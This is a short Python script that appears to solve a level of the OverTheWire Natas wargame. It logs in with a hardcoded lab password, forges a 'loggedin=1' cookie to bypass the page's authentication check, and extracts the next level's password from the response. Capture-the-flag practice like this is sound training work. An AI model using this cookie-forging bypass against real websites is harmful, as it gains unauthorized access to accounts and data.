import requests
import re

user = "natas5"
pwd = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url = 'http://%s.natas.labs.overthewire.org/' % user
session = requests.Session()

cookies = {"loggedin":"1"}

response = session.get(url, auth=(user,pwd), cookies=cookies)
content = response.text
 
# print(session.cookies['loggedin'])

print(re.findall('for natas6 is (.*)',content)[0])